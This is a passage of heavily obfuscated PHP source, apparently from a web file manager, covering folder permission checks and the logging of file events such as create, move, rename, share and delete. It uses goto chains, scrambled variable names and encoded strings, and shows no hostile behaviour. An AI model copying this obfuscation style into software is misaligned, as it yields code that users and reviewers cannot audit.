$b›ÑÙ½Ñˆ’[$C‹Ç¨ÆÂé[456]]; } } $Bãî„¶Õº = array_values(array_unique($Bãî„¶Õº)); $eá²˜ªäğà = $Bãî„¶Õº; goto dÊßĞ§ƒ¾; d°¢Á‘îµ‚: $fŠÜ²ëß‡ù = Model($C‹Ç¨ÆÂé[1126]); $a¿´Ì„½±š = Model($C‹Ç¨ÆÂé[458]); $A •¼è‹§• = array(); goto D”ôââä“Ü; bÃ¿©îâ…Ä: return $F„Å«÷è§¢; goto aŒ®ù¬; a°´µÙ…”Ñ: $C‹Ç¨ÆÂé =& $_SERVER[¯Ò¬Èè]; static $F„Å«÷è§¢ = false; if ($F„Å«÷è§¢) { return $F„Å«÷è§¢; } goto AËŠè‹·Ä; d‡¨Ëù±Œø: $Fğ¨¿—„šÕ = Session::get($C‹Ç¨ÆÂé[2226]); $Fğ¨¿—„šÕ = array_to_keyvalue($Fğ¨¿—„šÕ, $C‹Ç¨ÆÂé[33], $C‹Ç¨ÆÂé[2114]); $B·„Öª¸¤ = array($C‹Ç¨ÆÂé[371] => SourceModel::TYPE_USER, $C‹Ç¨ÆÂé[456] => USER_ID); goto F¥œŞŠ«Î¨; aŒ®ù¬: } private function makeSourceAuth($c¡´×î‰àÃ, $AØ÷¾–™‡¬) { goto Dé‰òÉ‡¾«; C‚ĞâŞò±‹: $b°“‹§£âï = $c¡´×î‰àÃ[$eŒÎõİß[456]]; $aêÄÚ»Í†è = $c¡´×î‰àÃ[$eŒÎõİß[371]] == SourceModel::TYPE_GROUP; if ($aêÄÚ»Í†è && isset($EéÜÂÙ‰[$b°“‹§£âï]) && !_get($GLOBALS, $eŒÎõİß[457])) { $Aø¹•íá„˜ = $EéÜÂÙ‰[$b°“‹§£âï]; if (Model($eŒÎõİß[2261])->authCheckRoot($Aø¹•íá„˜[$eŒÎõİß[376]][$eŒÎõİß[376]])) { $FªäØïÙÜ = Model($eŒÎõİß[458])->getInfo($b°“‹§£âï); $f³õ×¤É‹‰ = array($eŒÎõİß[2274] => intval($Aø¹•íá„˜[$eŒÎõİß[376]][$eŒÎõİß[376]]), $eŒÎõİß[2275] => $Aø¹•íá„˜[$eŒÎõİß[376]], $eŒÎõİß[2269] => array($eŒÎõİß[388] => $eŒÎõİß[2276], $eŒÎõİß[2277] => $FªäØïÙÜ[$eŒÎõİß[391]][$eŒÎõİß[369]], $eŒÎõİß[2278] => $FªäØïÙÜ[$eŒÎõİß[463]])); return $f³õ×¤É‹‰; } } goto FÅÊ¨Ó£©÷; Dõ×ïá—ÎÆ: return $f³õ×¤É‹‰; goto eè¾†„­; d½œ¾°Æ…‰: if (!$f³õ×¤É‹‰ && isset($EéÜÂÙ‰[$b°“‹§£âï])) { $Aø¹•íá„˜ = $EéÜÂÙ‰[$b°“‹§£âï]; $FªäØïÙÜ = Model($eŒÎõİß[458])->getInfo($b°“‹§£âï); $f³õ×¤É‹‰ = array($eŒÎõİß[2274] => intval($Aø¹•íá„˜[$eŒÎõİß[376]][$eŒÎõİß[376]]), $eŒÎõİß[2275] => $Aø¹•íá„˜[$eŒÎõİß[376]], $eŒÎõİß[2269] => array($eŒÎõİß[388] => $eŒÎõİß[2279], $eŒÎõİß[75] => $FªäØïÙÜ[$eŒÎõİß[391]][$eŒÎõİß[369]], $eŒÎõİß[2278] => $FªäØïÙÜ[$eŒÎõİß[463]])); } if (!$f³õ×¤É‹‰) { $FªäØïÙÜ = Model($eŒÎõİß[458])->getInfo($b°“‹§£âï); $A¾¡©ÅÆ°£ = explode($eŒÎõİß[47], trim($FªäØïÙÜ[$eŒÎõİß[459]], $eŒÎõİß[47])); foreach ($A¾¡©ÅÆ°£ as $e™Á˜Æ´à•) { if ($e™Á˜Æ´à• == $eŒÎõİß[468] || $e™Á˜Æ´à• == $c•Ú¿êà©İ) { continue; } if (!isset($EéÜÂÙ‰[$e™Á˜Æ´à•])) { continue; } $Aø¹•íá„˜ = $EéÜÂÙ‰[$e™Á˜Æ´à•]; $f³õ×¤É‹‰ = array($eŒÎõİß[2274] => intval($Aø¹•íá„˜[$eŒÎõİß[376]][$eŒÎõİß[376]]), $eŒÎõİß[2275] => $Aø¹•íá„˜[$eŒÎõİß[376]], $eŒÎõİß[2269] => array($eŒÎõİß[388] => $eŒÎõİß[2276], $eŒÎõİß[2277] => $FªäØïÙÜ[$eŒÎõİß[391]][$eŒÎõİß[369]], $eŒÎõİß[2278] => $FªäØïÙÜ[$eŒÎõİß[463]])); break; } } if (!$f³õ×¤É‹‰ || $f³õ×¤É‹‰[$eŒÎõİß[377]] <= 0) { $bÈšÅà¢ƒ· = $this->authDeepCheck($c¡´×î‰àÃ[$eŒÎõİß[369]]); if ($bÈšÅà¢ƒ·) { $f³õ×¤É‹‰ = $bÈšÅà¢ƒ·; } } goto Dõ×ïá—ÎÆ; Dé‰òÉ‡¾«: $eŒÎõİß =& $_SERVER[¯Ò¬Èè]; $EéÜÂÙ‰ = Session::get($eŒÎõİß[2226]); $EéÜÂÙ‰ = array_to_keyvalue($EéÜÂÙ‰, $eŒÎõİß[2114]); goto d¥´ßè¯; FÅÊ¨Ó£©÷: $f³õ×¤É‹‰ = !1; foreach ($Aßç†Åâ‡ñ as $cëœ‘†½”) { if (!isset($AØ÷¾–™‡¬[$cëœ‘†½”])) { continue; } $f¡©ÓèÚò× = $this->authMake($AØ÷¾–™‡¬[$cëœ‘†½”]); if ($f¡©ÓèÚò×[$eŒÎõİß[418]]) { $f³õ×¤É‹‰ = $f¡©ÓèÚò×; break; } } if (!$aêÄÚ»Í†è) { return $f³õ×¤É‹‰; } goto d½œ¾°Æ…‰; d¥´ßè¯: $c•Ú¿êà©İ = $eŒÎõİß[83]; $Aßç†Åâ‡ñ = Model($eŒÎõİß[1126])->parentLevelArray($c¡´×î‰àÃ[$eŒÎõİß[459]]); $Aßç†Åâ‡ñ = array_merge(array($c¡´×î‰àÃ[$eŒÎõİß[369]]), array_reverse($Aßç†Åâ‡ñ)); goto C‚ĞâŞò±‹; eè¾†„­: } public function authOwnerApply($b¥ßÃƒÜ) { goto FŠ¯‚Û–; B‰åš£‚òË: $CÙÒÜÄ—® = array(); $f‘‹™È•• = array(); foreach ($Aµ÷Ô‰Ì™õ as $a³¦‰‹¡„ => $c¨ÙèßáÙ) { $D±Í‹× = $this->authFolderOwnerUser($c¨ÙèßáÙ); $CÙÒÜÄ—®[$a³¦‰‹¡„] = $D±Í‹×; $f‘‹™È•• = array_merge($f‘‹™È••, $D±Í‹×[$C…‡¡İºÔª[544]]); if ($D±Í‹×[$C…‡¡İºÔª[2281]]) { break; } } goto aµ†Œ©øÃ; DÒ„ºØ²«“: $b¥ßÃƒÜ[$C…‡¡İºÔª[376]][$C…‡¡İºÔª[2282]] = Model($C…‡¡İºÔª[474])->userListInfo($f‘‹™È••); return $b¥ßÃƒÜ; goto E«è‹Ü¹»; FŠ¯‚Û–: $C…‡¡İºÔª =& $_SERVER[¯Ò¬Èè]; if (empty($b¥ßÃƒÜ[$C…‡¡İºÔª[376]]) || isset($b¥ßÃƒÜ[$C…‡¡İºÔª[2280]]) && $b¥ßÃƒÜ[$C…‡¡İºÔª[2280]]) { return $b¥ßÃƒÜ; } if (AuthModel::authCheckRoot($b¥ßÃƒÜ[$C…‡¡İºÔª[376]][$C…‡¡İºÔª[377]])) { return $b¥ßÃƒÜ; } goto d£¥µ¥Æ·È; aµ†Œ©øÃ: if (count($f‘‹™È••) == 0) { $f‘‹™È•• = $this->authFolderOwnerGroup($b¥ßÃƒÜ[$C…‡¡İºÔª[456]]); } $f‘‹™È•• = array_unique($f‘‹™È••); if (AuthModel::authCheckRoot($b¥ßÃƒÜ[$C…‡¡İºÔª[376]][$C…‡¡İºÔª[377]])) { $f‘‹™È••[] = USER_ID; } goto DÒ„ºØ²«“; d£¥µ¥Æ·È: $FšÓóâŒ“ = Model($C…‡¡İºÔª[1126])->parentLevelArray($b¥ßÃƒÜ[$C…‡¡İºÔª[459]]); $FšÓóâŒ“ = array_merge(array($b¥ßÃƒÜ[$C…‡¡İºÔª[369]]), array_reverse($FšÓóâŒ“)); $bˆÛ³¨²“ = $C…‡¡İºÔª[2264]; goto B¸ŠÂÍœ‡Ì; B¸ŠÂÍœ‡Ì: $d‘±½Œ”ÀÙ = array($C…‡¡İºÔª[383] => array($C…‡¡İºÔª[384], $FšÓóâŒ“)); $Aµ÷Ô‰Ì™õ = $this->field($bˆÛ³¨²“)->where($d‘±½Œ”ÀÙ)->select(); $Aµ÷Ô‰Ì™õ = array_to_keyvalue_group($Aµ÷Ô‰Ì™õ, $C…‡¡İºÔª[369]); goto B‰åš£‚òË; E«è‹Ü¹»: } private function authFolderOwnerGroup($dã›îÓÉ·) { $fİÖ›àäèá =& $_SERVER[¯Ò¬Èè]; $c”´àÍò± = Model($fİÖ›àäèá[2188])->where(array($fİÖ›àäèá[2114] => $dã›îÓÉ·))->select(); $dæ‹áÒÎ = array(); if (!$c”´àÍò±) { return $dæ‹áÒÎ; } foreach ($c”´àÍò± as $eÏÒë†º’¬) { $EÃÌ‡Ÿˆäª = $this->authInfo($eÏÒë†º’¬); if (AuthModel::authCheckRoot($EÃÌ‡Ÿˆäª[$fİÖ›àäèá[376]])) { $dæ‹áÒÎ[] = $eÏÒë†º’¬[$fİÖ›àäèá[1446]]; } } return $dæ‹áÒÎ; } private function authFolderOwnerUser($d£³Ü”çÄº) { $a°İå¤Š¯Œ =& $_SERVER[¯Ò¬Èè]; $BÌ§İ‹‡É = array(); $e£” ¹„ = !1; foreach ($d£³Ü”çÄº as $Bó­Û¬ëäÕ) { $D–Õ—ç¹§ê = $this->authInfo($Bó­Û¬ëäÕ); if ($Bó­Û¬ëäÕ[$a°İå¤Š¯Œ[456]] == $a°İå¤Š¯Œ[468]) { $e£” ¹„ = !0; } if ($Bó­Û¬ëäÕ[$a°İå¤Š¯Œ[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($D–Õ—ç¹§ê[$a°İå¤Š¯Œ[376]])) { $BÌ§İ‹‡É[] = $Bó­Û¬ëäÕ[$a°İå¤Š¯Œ[456]]; } } } return array($a°İå¤Š¯Œ[544] => $BÌ§İ‹‡É, $a°İå¤Š¯Œ[2281] => $e£” ¹„); } public function authMake($E‚®¥ÆÚÃ´) { goto B·¶²¥ßÔÕ; eôµÜêÛË¼: $E ğìÚœ®è = 0; $bòËù´ó©ô = 0; $B½è»Úºİ‘ = 0; goto D®©Ğé­å¶; bÅå¦‹õÓô: $dÑŒäíºòÍ = 0; $DÓ¦Ş Ûİ„ = 0; $B¹ãÚáÓºà = 0; goto eôµÜêÛË¼; Cæ–ŒåÛÙ: $dèò°‹×¶ = $bòËù´ó©ô ? $cÅÙ•Ì®ññ : ($B½è»Úºİ‘ ? $D¢ôâò‚ô¦ : $dÑŒäíºòÍ); $dùô„¯Šùİ = $bòËù´ó©ô ? $DÓ¦Ş Ûİ„ : ($B½è»Úºİ‘ ? $B¹ãÚáÓºà : $E ğìÚœ®è); $Dª–½¤ƒÖÓ = $bòËù´ó©ô ? $dã§˜µ£Àõ[2283] : ($B½è»Úºİ‘ ? $dã§˜µ£Àõ[2284] : ($F–„–•¶ä  ? $dã§˜µ£Àõ[2285] : $dã§˜µ£Àõ[361])); goto aŠË‰ŠÕÆ; B·¶²¥ßÔÕ: $dã§˜µ£Àõ =& $_SERVER[¯Ò¬Èè]; if (!$E‚®¥ÆÚÃ´) { return array($dã§˜µ£Àõ[377] => 0, $dã§˜µ£Àõ[418] => !1); } $d‚·¦¶²™ = Session::get($dã§˜µ£Àõ[2226]); goto Dä²Î…ÀµÃ; D®©Ğé­å¶: $F–„–•¶ä  = 0; $cáÛÜ°×ˆ¤ = array($dã§˜µ£Àõ[369] => 0); foreach ($E‚®¥ÆÚÃ´ as $cáÛÜ°×ˆ¤) { $dùô„¯Šùİ = $this->authInfo($cáÛÜ°×ˆ¤); $Eæ‘ÀØåîã = $cáÛÜ°×ˆ¤[$dã§˜µ£Àõ[456]]; $c¼×‹ÙÂÆ‹ = intval($dùô„¯Šùİ[$dã§˜µ£Àõ[376]]); if ($cáÛÜ°×ˆ¤[$dã§˜µ£Àõ[371]] == SourceModel::TYPE_USER && $Eæ‘ÀØåîã == USER_ID) { $bòËù´ó©ô = !0; $DÓ¦Ş Ûİ„ = $dùô„¯Šùİ; $cÅÙ•Ì®ññ = $c¼×‹ÙÂÆ‹; } else { if ($cáÛÜ°×ˆ¤[$dã§˜µ£Àõ[371]] == SourceModel::TYPE_GROUP && in_array($Eæ‘ÀØåîã, $FàÕ™‰ç±ƒ)) { $B½è»Úºİ‘ = !0; if ($c¼×‹ÙÂÆ‹ >= $D¢ôâò‚ô¦) { $D¢ôâò‚ô¦ = $c¼×‹ÙÂÆ‹; $B¹ãÚáÓºà = $dùô„¯Šùİ; } } else { if ($Eæ‘ÀØåîã == $dã§˜µ£Àõ[468]) { $F–„–•¶ä  = !0; $E ğìÚœ®è = $dùô„¯Šùİ; $dÑŒäíºòÍ = $c¼×‹ÙÂÆ‹; } } } } goto Cæ–ŒåÛÙ; Dä²Î…ÀµÃ: $FàÕ™‰ç±ƒ = array_to_keyvalue($d‚·¦¶²™, $dã§˜µ£Àõ[33], $dã§˜µ£Àõ[2114]); $cÅÙ•Ì®ññ = 0; $D¢ôâò‚ô¦ = 0; goto bÅå¦‹õÓô; aŠË‰ŠÕÆ: $f¸ï›¯¶°ñ = array($dã§˜µ£Àõ[2274] => intval($dèò°‹×¶), $dã§˜µ£Àõ[2275] => $dùô„¯Šùİ, $dã§˜µ£Àõ[2269] => array($dã§˜µ£Àõ[388] => $Dª–½¤ƒÖÓ, $dã§˜µ£Àõ[75] => $cáÛÜ°×ˆ¤[$dã§˜µ£Àõ[369]])); return $f¸ï›¯¶°ñ; goto EÒšÅâÕ; EÒšÅâÕ: } public function authTargetInfoMake($BÀî †‰áà) { goto Có×‡Şè±¡; c­ĞœáÊ: foreach ($BÀî †‰áà as $c“øÅ¾ÅŒÜ) { if ($c“øÅ¾ÅŒÜ[$f¡å›ù£õ[371]] == SourceModel::TYPE_USER) { $c÷ƒ–ëøé[] = intval($c“øÅ¾ÅŒÜ[$f¡å›ù£õ[456]]); } else { if ($c“øÅ¾ÅŒÜ[$f¡å›ù£õ[371]] == SourceModel::TYPE_GROUP) { $BëË”åİ[] = intval($c“øÅ¾ÅŒÜ[$f¡å›ù£õ[456]]); } } } if ($c÷ƒ–ëøé) { $c÷ƒ–ëøé = Model($f¡å›ù£õ[474])->userListInfo($c÷ƒ–ëøé); } if ($BëË”åİ) { $E…‡ìˆ—êÀ = array($f¡å›ù£õ[2186] => array($f¡å›ù£õ[384], $BëË”åİ)); $BëË”åİ = Model($f¡å›ù£õ[458])->field($f¡å›ù£õ[2199])->where($E…‡ìˆ—êÀ)->select(); $BëË”åİ = array_to_keyvalue($BëË”åİ, $f¡å›ù£õ[2114]); } goto B™œ›Æ£ˆ¦; B™œ›Æ£ˆ¦: return array($f¡å›ù£õ[2286] => $c÷ƒ–ëøé, $f¡å›ù£õ[2278] => $BëË”åİ); goto D¶¹Í¼«Á×; Có×‡Şè±¡: $f¡å›ù£õ =& $_SERVER[¯Ò¬Èè]; $c÷ƒ–ëøé = array(); $BëË”åİ = array(); goto c­ĞœáÊ; D¶¹Í¼«Á×: } private function authInfo($e„—Ë»°•) { $A•»”Óê’Ô =& $_SERVER[¯Ò¬Èè]; if ($e„—Ë»°•[$A•»”Óê’Ô[2242]]) { $F¥è†Îñ’Û = Model($A•»”Óê’Ô[2261])->listData($e„—Ë»°•[$A•»”Óê’Ô[2242]]); if (!$F¥è†Îñ’Û) { return !1; $Cô¿ÕÎ¨àë = Model($A•»”Óê’Ô[2261])->listData(); $FëŞïÌøù = array_filter_by_field($Cô¿ÕÎ¨àë, $A•»”Óê’Ô[376], $A•»”Óê’Ô[468]); return $FëŞïÌøù; } $a«ê¨ö®ó = array_field_key($F¥è†Îñ’Û, array($A•»”Óê’Ô[367], $A•»”Óê’Ô[28], $A•»”Óê’Ô[376], $A•»”Óê’Ô[2132], $A•»”Óê’Ô[2135])); $a«ê¨ö®ó[$A•»”Óê’Ô[2287]] = $e„—Ë»°•; return $a«ê¨ö®ó; } else { return array($A•»”Óê’Ô[385] => 0, $A•»”Óê’Ô[2120] => $e„—Ë»°•[$A•»”Óê’Ô[2243]], $A•»”Óê’Ô[386] => $A•»”Óê’Ô[33], $A•»”Óê’Ô[2132] => $A•»”Óê’Ô[2288]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\145\x5f\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\151\155\145", "\164\151\x6d\x65", "\151\156\163\145\x72\164", "\146\165\x6e\143\164\x69\157\156"), array("\x64\145\x73\143", '', "\151\x6e\163\145\162\164\54\165\x70\144\141\164\145\x2c\x73\145\x6c\x65\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D¤Ì‡µÆğ, $Có„è‹íŸò, $d­¸‘ĞÈÂ = '') { goto f¼ÕŒ„¾ø¯; d—¥åé¬Øñ: if (!$dÀçİÀ©¿) { return !1; } if ($this->isCacheEvent($dÀçİÀ©¿, $Có„è‹íŸò)) { return; } if ($d­¸‘ĞÈÂ && is_string($d­¸‘ĞÈÂ)) { $d­¸‘ĞÈÂ = array($d™ˆôËƒ“[2144] => $d­¸‘ĞÈÂ); } goto e¸ÅšÛ¸; f¼ÕŒ„¾ø¯: $d™ˆôËƒ“ =& $_SERVER[¯Ò¬Èè]; if (!$this->eventSave) { return; } $dÀçİÀ©¿ = Model($d™ˆôËƒ“[1126])->sourceInfo($D¤Ì‡µÆğ); goto d—¥åé¬Øñ; e¸ÅšÛ¸: $E†˜ŸÑÌë‰ = array($d™ˆôËƒ“[383] => $D¤Ì‡µÆğ, $d™ˆôËƒ“[2289] => $dÀçİÀ©¿[$d™ˆôËƒ“[461]], $d™ˆôËƒ“[2290] => $dÀçİÀ©¿[$d™ˆôËƒ“[28]], $d™ˆôËƒ“[466] => $dÀçİÀ©¿[$d™ˆôËƒ“[466]], $d™ˆôËƒ“[1437] => USER_ID, $d™ˆôËƒ“[388] => $Có„è‹íŸò, $d™ˆôËƒ“[1439] => $d­¸‘ĞÈÂ); $this->addSystemLog($Có„è‹íŸò, $E†˜ŸÑÌë‰); return $this->add($E†˜ŸÑÌë‰); goto eî‚œÉ’ìø; eî‚œÉ’ìø: } private function addSystemLog($D¹í«É§Ì, $eÊšæÕØ‘) { $c¦íé§µÊ› =& $_SERVER[¯Ò¬Èè]; if ($D¹í«É§Ì == $c¦íé§µÊ›[2291]) { $D¹í«É§Ì = $eÊšæÕØ‘[$c¦íé§µÊ›[405]][$c¦íé§µÊ›[2292]]; } else { if (in_array($D¹í«É§Ì, array($c¦íé§µÊ›[2091], $c¦íé§µÊ›[2293]))) { $D¹í«É§Ì = $eÊšæÕØ‘[$c¦íé§µÊ›[405]][$c¦íé§µÊ›[706]]; } } $Aî×Ç‘Úí = array_merge($eÊšæÕØ‘, array($c¦íé§µÊ›[2294] => $eÊšæÕØ‘[$c¦íé§µÊ›[369]], $c¦íé§µÊ›[2295] => $eÊšæÕØ‘[$c¦íé§µÊ›[2295]])); Model($c¦íé§µÊ›[2054])->addLog($c¦íé§µÊ›[2296] . $D¹í«É§Ì, $Aî×Ç‘Úí); } private function isCacheEvent($eğÒ”í†ìÀ, $e„‡Ş¡Åª) { if ($eğÒ”í†ìÀ[$_SERVER[¯Ò¬Èè][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F÷Ùìõ”·¬, $a¶¡¬ÓÆƒÕ) { $E³£†Í£å¦ =& $_SERVER[¯Ò¬Èè]; $BÛÌ„±î£Æ = Model($E³£†Í£å¦[1126])->sourceInfo($F÷Ùìõ”·¬); $D½èğ÷§è = array($E³£†Í£å¦[2292] => $a¶¡¬ÓÆƒÕ, $E³£†Í£å¦[28] => $BÛÌ„±î£Æ[$E³£†Í£å¦[28]]); return $this->addEvent($F÷Ùìõ”·¬, $E³£†Í£å¦[2291], $D½èğ÷§è); } public function eventFileEdit($bÖ¯ÀÅï®ø) { $aÛ…äÊ¢ÒÔ =& $_SERVER[¯Ò¬Èè]; $c°ÙÔëïİ = array($aÛ…äÊ¢ÒÔ[2297] => $_SERVER[$aÛ…äÊ¢ÒÔ[2298]], $aÛ…äÊ¢ÒÔ[1760] => strtolower(ACTION)); return $this->addEvent($bÖ¯ÀÅï®ø, $aÛ…äÊ¢ÒÔ[2081], $c°ÙÔëïİ); } public function eventRecycle($a™á†—Ğƒ, $EÎÓ™Şºˆ) { return $this->addEvent($a™á†—Ğƒ, $_SERVER[¯Ò¬Èè][2293], $EÎÓ™Şºˆ); } public function eventRemove($a’¨Í§Ş…) { $Dò¹»Ùâ‚œ =& $_SERVER[¯Ò¬Èè]; $D¢ßÖ¡–›å = Model($Dò¹»Ùâ‚œ[1126])->sourceInfo($a’¨Í§Ş…); $DÛİÜÔº¿ˆ = $D¢ßÖ¡–›å[$Dò¹»Ùâ‚œ[28]]; return $this->addEvent($D¢ßÖ¡–›å[$Dò¹»Ùâ‚œ[461]], $Dò¹»Ùâ‚œ[2080], $DÛİÜÔº¿ˆ); } public function eventShare($eË¶Š¨™ÀÉ, $a²¹‰“–’) { return $this->addEvent($eË¶Š¨™ÀÉ, $_SERVER[¯Ò¬Èè][2091], $a²¹‰“–’); } public function eventMove($F™°óÙ«‰, $bæ’Ó£±’ã, $C©ôÂµ‘Ö) { goto bñÌƒ¤í´; D£Ì‰îÒ è: $Fµ¢æÑ¯Š© = $A‘÷‡“ÀÈÙ->sourceInfo($bæ’Ó£±’ã); $FÇŸ»Úó¶ª = $A‘÷‡“ÀÈÙ->sourceInfo($C©ôÂµ‘Ö); $D²±ì®¡„ = array($BÛ«òĞªÊ[1016] => $bæ’Ó£±’ã, $BÛ«òĞªÊ[2299] => $Fµ¢æÑ¯Š©[$BÛ«òĞªÊ[28]], $BÛ«òĞªÊ[2300] => $Fµ¢æÑ¯Š©[$BÛ«òĞªÊ[466]], $BÛ«òĞªÊ[1017] => $C©ôÂµ‘Ö, $BÛ«òĞªÊ[2301] => $FÇŸ»Úó¶ª[$BÛ«òĞªÊ[28]], $BÛ«òĞªÊ[2302] => $FÇŸ»Úó¶ª[$BÛ«òĞªÊ[466]]); goto DĞ÷¯“œ³¨; Aœ²ÏÖ¿Ò”: $this->addEvent($bæ’Ó£±’ã, $BÛ«òĞªÊ[2303], $D²±ì®¡„); goto f£¬‹ç”¡±; DĞ÷¯“œ³¨: $this->addEvent($F™°óÙ«‰, $BÛ«òĞªÊ[501], $D²±ì®¡„); $FÍê·®Ò = $A‘÷‡“ÀÈÙ->sourceInfo($F™°óÙ«‰); $D²±ì®¡„ = array($BÛ«òĞªÊ[369] => $FÍê·®Ò[$BÛ«òĞªÊ[369]], $BÛ«òĞªÊ[28] => $FÍê·®Ò[$BÛ«òĞªÊ[28]]); goto Aœ²ÏÖ¿Ò”; bñÌƒ¤í´: $BÛ«òĞªÊ =& $_SERVER[¯Ò¬Èè]; $A‘÷‡“ÀÈÙ = Model($BÛ«òĞªÊ[1126]); $FÍê·®Ò = $A‘÷‡“ÀÈÙ->sourceInfo($F™°óÙ«‰); goto D£Ì‰îÒ è; f£¬‹ç”¡±: } public function eventCopy($bÔ”õËÑ‚Î) { $this->eventCreate($bÔ”õËÑ‚Î, $_SERVER[¯Ò¬Èè][499]); } public function eventRename($F‰ì”›Ëœ¦, $e“°›Ûæ‹Ä, $BêÛ¯‘Üí) { $E¦©´æ¸ã =& $_SERVER[¯Ò¬Èè]; $CÌ¢˜ß¦Ûˆ = array($E¦©´æ¸ã[1016] => $e“°›Ûæ‹Ä, $E¦©´æ¸ã[1017] => $BêÛ¯‘Üí); return $this->addEvent($F‰ì”›Ëœ¦, $E¦©´æ¸ã[1138], $CÌ¢˜ß¦Ûˆ); } public function eventAddComment($Fåª–òëÅ², $D²Êœğöº÷) { return $this->addEvent($Fåª–òëÅ², $_SERVER[¯Ò¬Èè][2304], $D²Êœğöº÷); } public function eventAddDesc($F°í…Î´’¡, $Bë’²”ßÆä) { return $this->addEvent($F°í…Î´’¡, $_SERVER[¯Ò¬Èè][2305], $Bë’²”ßÆä); } public function listBySource($AÚ½Ñ²Ã’) { goto B’¥ˆßÆÆ; B’¥ˆßÆÆ: $fÚãˆìñïŒ =& $_SERVER[¯Ò¬Èè]; $C‰¿©Ú‰æ¬ = Model($fÚãˆìñïŒ[1126])->sourceInfo($AÚ½Ñ²Ã’); $E¬é‹ÆåÔ = array($fÚãˆìñïŒ[383] => $AÚ½Ñ²Ã’); goto bãÒöˆîÈË; FÉŠ‹‰ßÛµ: return $this->eventListParse($bÂãªÍó˜ï, $AÚ½Ñ²Ã’); goto e ½ø·¢’ô; bãÒöˆîÈË: if ($C‰¿©Ú‰æ¬[$fÚãˆìñïŒ[370]] == $fÚãˆìñïŒ[83]) { $BˆõäÛÛ¥ = Model($fÚãˆìñïŒ[1126])->listSearchChildren($AÚ½Ñ²Ã’, 20000); $BˆõäÛÛ¥[] = $AÚ½Ñ²Ã’ . $fÚãˆìñïŒ[361]; $E¬é‹ÆåÔ = array($fÚãˆìñïŒ[369] => array($fÚãˆìñïŒ[7], $BˆõäÛÛ¥)); } $bÂãªÍó˜ï = $this->where($E¬é‹ÆåÔ)->order($fÚãˆìñïŒ[2306])->selectPage(); if ($bÂãªÍó˜ï[$fÚãˆìñïŒ[351]][$fÚãˆìñïŒ[352]] == 0) { $bÂãªÍó˜ï[$fÚãˆìñïŒ[351]][$fÚãˆìñïŒ[352]] = 1; $bÂãªÍó˜ï[$fÚãˆìñïŒ[354]] = array(array($fÚãˆìñïŒ[383] => $AÚ½Ñ²Ã’, $fÚãˆìñïŒ[2289] => $C‰¿©Ú‰æ¬[$fÚãˆìñïŒ[461]], $fÚãˆìñïŒ[1437] => $C‰¿©Ú‰æ¬[$fÚãˆìñïŒ[378]], $fÚãˆìñïŒ[388] => $fÚãˆìñïŒ[2307], $fÚãˆìñïŒ[389] => $C‰¿©Ú‰æ¬[$fÚãˆìñïŒ[187]], $fÚãˆìñïŒ[1439] => $fÚãˆìñïŒ[33])); } goto FÉŠ‹‰ßÛµ; e ½ø·¢’ô: } private function eventListParse($Eë†‹¤·º÷, $FêáŸå»òµ) { goto CÇ˜¿Ûé¼; f´½š…ó‘¦: $c•·‹—¥Ï’ = Model($Eè—»¶ÚÃô[767])->sourceListInfo($b·èˆŒ—å, !0); foreach ($CÁÈÏí“™Ë as &$aÆ±‡ Â¡È) { if ($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[29]] == $Eè—»¶ÚÃô[501] && isset($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[1016]])) { $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[1016]] = $c•·‹—¥Ï’[$aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[1016]]]; $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[1017]] = $c•·‹—¥Ï’[$aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[1017]]]; } if ($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[29]] == $Eè—»¶ÚÃô[2303] && isset($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[369]])) { $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[369]] = $c•·‹—¥Ï’[$aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]][$Eè—»¶ÚÃô[369]]]; } $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[391]] = $c•·‹—¥Ï’[$aÆ±‡ Â¡È[$Eè—»¶ÚÃô[369]]]; $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[2308]] = $c•·‹—¥Ï’[$aÆ±‡ Â¡È[$Eè—»¶ÚÃô[2295]]]; if ($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[29]] == $Eè—»¶ÚÃô[2080]) { $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[2308]] = $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[391]]; $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[2295]] = $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[2308]][$Eè—»¶ÚÃô[369]]; $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[391]] = !1; $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[369]] = $Eè—»¶ÚÃô[33]; } $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[2251]] = $CêÊì­†á[$aÆ±‡ Â¡È[$Eè—»¶ÚÃô[1446]]]; } $Eë†‹¤·º÷[$Eè—»¶ÚÃô[354]] = $CÁÈÏí“™Ë; goto D‹Ãè¬›Ó; D¦‰¦²¨»œ: $bÏ¼Úºê© = array_to_keyvalue($CÁÈÏí“™Ë, $Eè—»¶ÚÃô[33], $Eè—»¶ÚÃô[2295]); foreach ($CÁÈÏí“™Ë as $aÆ±‡ Â¡È) { $e…¿Ïçêî = $aÆ±‡ Â¡È[$Eè—»¶ÚÃô[405]]; if ($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[29]] == $Eè—»¶ÚÃô[501] && isset($e…¿Ïçêî[$Eè—»¶ÚÃô[1016]])) { $b·èˆŒ—å[] = $e…¿Ïçêî[$Eè—»¶ÚÃô[1016]] . 